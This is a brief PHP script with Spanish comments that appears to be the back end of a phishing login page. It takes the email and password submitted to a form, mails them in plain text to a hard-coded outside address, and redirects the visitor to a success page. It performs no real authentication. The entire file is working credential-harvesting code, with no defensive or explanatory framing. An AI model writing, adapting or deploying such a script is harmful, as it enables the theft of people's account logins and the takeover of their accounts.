<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Correo al que se enviará la información
    $to = "roniifelipe@gmail.com";
    $subject = "Datos de inicio de sesión";
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;

    // Enviar el correo electrónico
    mail($to, $subject, $message);

    // Redireccionar a una página de éxito
    header("Location: exito.html");
} else {
    // Si se accede directamente a este script, redirigir a la página de inicio de sesión
    header("Location: login.html");
}
?>
